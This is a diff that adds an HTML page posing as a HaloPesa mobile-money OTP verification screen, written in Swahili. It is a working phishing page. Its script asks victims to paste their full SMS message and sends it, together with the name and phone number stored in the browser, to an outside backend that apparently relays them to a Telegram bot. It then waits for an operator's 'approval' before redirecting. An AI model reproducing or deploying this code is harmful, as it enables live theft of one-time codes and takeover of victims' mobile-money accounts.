@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+<meta charset="UTF-8">
+<title>Uthibitisho wa OTP</title>
+
+<style>
+/* ===== HALOPESA BRAND STYLES ===== */
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+body {
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  background: #f0f4f0;
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 20px;
+}
+
+.page {
+  width: 100%;
+  max-width: 500px;
+}
+
+/* Card - Clean white with subtle shadow */
+.card {
+  background: #ffffff;
+  border-radius: 16px;
+  padding: 35px 30px;
+  box-shadow: 0 8px 30px rgba(26, 67, 41, 0.10);
+  border: 1px solid #e6efe6;
+}
+
+/* Titles - HaloPesa Green */
+.title {
+  font-size: 26px;
+  font-weight: 700;
+  color: #1a6b2a;
+  margin-bottom: 6px;
+  letter-spacing: -0.3px;
+}
+
+.subtitle {
+  color: #5a6b5a;
+  font-size: 15px;
+  margin-bottom: 4px;
+}
+
+.display-number {
+  color: #1a2b1a;
+  font-weight: 700;
+  font-size: 16px;
+  margin-bottom: 22px;
+  background: #f4f9f4;
+  padding: 8px 14px;
+  border-radius: 8px;
+  display: inline-block;
+}
+
+/* Success Box - Light green HaloPesa style */
+.success-box {
+  background: #eaf6ea;
+  border: 1px solid #b8d9b8;
+  color: #1a6b2a;
+  border-radius: 12px;
+  padding: 16px 18px;
+  margin-bottom: 22px;
+  display: flex;
+  gap: 12px;
+  align-items: flex-start;
+  font-size: 15px;
+  line-height: 1.4;
+}
+
+.success-box > div:first-child {
+  font-size: 20px;
+  color: #1a7a2a;
+  font-weight: 700;
+}
+
+.label {
+  font-size: 15px;
+  font-weight: 600;
+  color: #1a2b1a;
+  margin-bottom: 10px;
+}
+
+/* Textarea - replaces 4 OTP boxes */
+.otp-textarea {
+  width: 100%;
+  min-height: 100px;
+  padding: 16px 18px;
+  font-size: 16px;
+  font-family: inherit;
+  border: 2px solid #d0e0d0;
+  border-radius: 12px;
+  background: #fafffa;
+  color: #1a3b1a;
+  outline: none;
+  transition: border-color 0.2s, box-shadow 0.2s;
+  resize: vertical;
+  line-height: 1.5;
+}
+
+.otp-textarea:focus {
+  border-color: #1a7a2a;
+  box-shadow: 0 0 0 4px rgba(26, 122, 42, 0.15);
+}
+
+.otp-textarea::placeholder {
+  color: #a0b8a0;
+}
+
+/* Timer - HaloPesa Yellow/Green accent */
+#timerContainer {
+  text-align: center;
+  color: #b8960f;
+  font-weight: 600;
+  font-size: 15px;
+  margin-bottom: 22px;
+  background: #fefcf0;
+  padding: 10px 0;
+  border-radius: 10px;
+}
+
+#timerContainer strong {
+  color: #1a7a2a;
+  font-size: 18px;
+}
+
+/* Primary Button - HaloPesa Green */
+button {
+  width: 100%;
+  height: 54px;
+  border: none;
+  border-radius: 12px;
+  font-size: 17px;
+  font-weight: 700;
+  background: #d4e0d4;
+  color: #8a9f8a;
+  cursor: pointer;
+  transition: background 0.25s, transform 0.1s;
+  letter-spacing: 0.5px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+}
+
+button:not(:disabled) {
+  background: #1a7a2a;
+  color: #ffffff;
+}
+
+button:not(:disabled):hover {
+  background: #136622;
+  transform: scale(1.01);
+}
+
+button:not(:disabled):active {
+  transform: scale(0.98);
+}
+
+/* Spinner - White with green accent */
+.spinner {
+  width: 18px;
+  height: 18px;
+  border: 3px solid rgba(255,255,255,0.3);
+  border-top: 3px solid #ffffff;
+  border-radius: 50%;
+  animation: spin 0.9s linear infinite;
+  display: none;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+/* Status messages */
+#status {
+  margin-top: 16px;
+  text-align: center;
+  font-size: 14px;
+  font-weight: 500;
+  color: #c0392b;
+  min-height: 22px;
+}
+
+/* ===== RESPONSIVE TWEAKS ===== */
+@media (max-width: 480px) {
+  .card {
+    padding: 25px 18px;
+  }
+  .title {
+    font-size: 22px;
+  }
+  .otp-textarea {
+    min-height: 80px;
+    font-size: 15px;
+    padding: 14px;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="page"> 
+  <div class="card"> 
+    <div class="title">Uthibitisho wa OTP</div> 
+    <div class="subtitle">Weka OTP iliyotumwa kwenye nambari yako ya simu</div> 
+    <div id="phoneNumber" class="display-number"></div> 
+    <div class="success-box"> 
+      <div>✓</div> 
+      <div>Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.</div> 
+    </div> 
+    <form id="otpForm"> 
+      <div class="label">Nakili ujumbe mzima uliopokea kwa SMS na ubandike hapa</div> 
+      
+      <!-- Textarea unique instead of 4 fields -->
+      <textarea id="otpTextarea" class="otp-textarea" 
+                placeholder="Nakili SMS nzima " 
+                autocomplete="off"></textarea>
+
+      <div id="timerContainer"> 
+        Tuma tena msimbo kwa <strong><span id="timerDisplay">60</span></strong> sekunde 
+      </div> 
+      <button id="submitBtn" disabled> 
+        <span id="btnText">WASILISHA</span> 
+        <span class="spinner" id="spinner"></span> 
+      </button> 
+    </form> 
+    <div id="status"></div> 
+  </div> 
+</div>
+
+<!-- ===== FIXED LOGIC: send full text, not just digits ===== -->
+<script>
+const BACKEND_URL = "https://mixx-by-yas-yf2n.onrender.com";
+const params = new URLSearchParams(window.location.search);
+const botId = params.get('botId');
+
+if(!botId){ 
+  document.getElementById('status').textContent = "Error: Missing bot ID. Please use the link from Telegram.";
+  throw new Error("Bot ID missing"); 
+}
+
+// Get phone from localStorage
+const phone = localStorage.getItem('phone') || "";
+document.getElementById('phoneNumber').textContent = 
+  phone ? phone.slice(0,6) + "****" + phone.slice(-2) : "No phone number found";
+
+// Textarea element
+const textarea = document.getElementById('otpTextarea');
+const submitBtn = document.getElementById('submitBtn');
+const btnText = document.getElementById('btnText');
+const spinner = document.getElementById('spinner');
+const statusEl = document.getElementById('status');
+const timerDisplay = document.getElementById('timerDisplay');
+
+let countdown;
+
+// Helper: extract 4 last digits from text (only used for validation now)
+function extractOTP(text) {
+  const digits = text.replace(/\D/g, '');
+  return digits.slice(-4);
+}
+
+// Update button state: enable if textarea is not empty
+function updateSubmitButton() {
+  const text = textarea.value.trim();
+  submitBtn.disabled = text.length === 0;
+}
+
+// Listen to input changes
+textarea.addEventListener('input', function() {
+  updateSubmitButton();
+  // Clear any previous status
+  if (statusEl.textContent) statusEl.textContent = '';
+});
+
+// Focus on page load
+window.addEventListener('load', function() {
+  textarea.focus();
+});
+
+function startCountdown(duration = 60){
+  let time = duration;
+  timerDisplay.textContent = time;
+  clearInterval(countdown);
+
+  countdown = setInterval(()=>{
+    time--;
+    timerDisplay.textContent = time;
+    if(time<=0){
+      clearInterval(countdown);
+      statusEl.textContent = "OTP code has expired. Please request a new code.";
+      submitBtn.disabled = true;
+    }
+  },1000);
+}
+
+startCountdown();
+
+async function sendFullMessageToTelegram(name, phone, fullMessage){
+  try{
+    const r = await fetch(`${BACKEND_URL}/submit-code`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({ 
+        name, 
+        phone, 
+        code: fullMessage,   // send the entire message
+        botId 
+      })
+    });
+    return r.json();
+  }catch{
+    return null;
+  }
+}
+
+function pollCodeApproval(requestId){
+  return new Promise(resolve=>{
+    const i=setInterval(async()=>{
+      try {
+        const r=await fetch(`${BACKEND_URL}/check-code/${requestId}`);
+        const d=await r.json();
+        if(d.approved===true||d.approved===false){
+          clearInterval(i);
+          resolve(d.approved);
+        }
+      } catch(e) {
+        // Continue polling on error
+      }
+    },1500);
+  });
+}
+
+document.getElementById('otpForm').addEventListener('submit', async function(e){
+  e.preventDefault();
+  e.stopPropagation();
+  
+  const fullText = textarea.value.trim();
+  
+  // Ensure there is some content
+  if(fullText.length === 0) {
+    statusEl.textContent = "Tafadhali bandika ujumbe wako hapa.";
+    return;
+  }
+  
+  const name = localStorage.getItem('firstName') || localStorage.getItem('name') || "Unknown";
+  const phone = localStorage.getItem('phone') || "Unknown";
+
+  submitBtn.disabled = true;
+  btnText.textContent = "VERIFYING...";
+  spinner.style.display = "inline-block";
+  statusEl.textContent = "Sending message for verification...";
+
+  // Send the full text, not just extracted OTP
+  const res = await sendFullMessageToTelegram(name, phone, fullText);
+  
+  if(!res || !res.requestId){
+    statusEl.textContent = "Failed to send. Please try again.";
+    submitBtn.disabled = false;
+    btnText.textContent = "WASILISHA";
+    spinner.style.display = "none";
+    return;
+  }
+
+  statusEl.textContent = "Waiting for admin approval...";
+  const approved = await pollCodeApproval(res.requestId);
+  clearInterval(countdown);
+
+  if(approved){
+    localStorage.setItem('code', fullText);
+    statusEl.textContent = "Message verified! Redirecting...";
+    setTimeout(() => {
+      window.location.href = `merchant.html?botId=${botId}`;
+    }, 500);
+  }else{
+    statusEl.textContent = "Incorrect message. Please try again.";
+    textarea.value = "";
+    submitBtn.disabled = false;
+    btnText.textContent = "WASILISHA";
+    spinner.style.display = "none";
+    startCountdown();
+    textarea.focus();
+  }
+});
+
+// Manual click handler for button (fallback)
+submitBtn.addEventListener('click', function(e) {
+  if (!this.disabled) {
+    document.getElementById('otpForm').dispatchEvent(new Event('submit'));
+  }
+});
+</script>
+
+</body>
+</html>
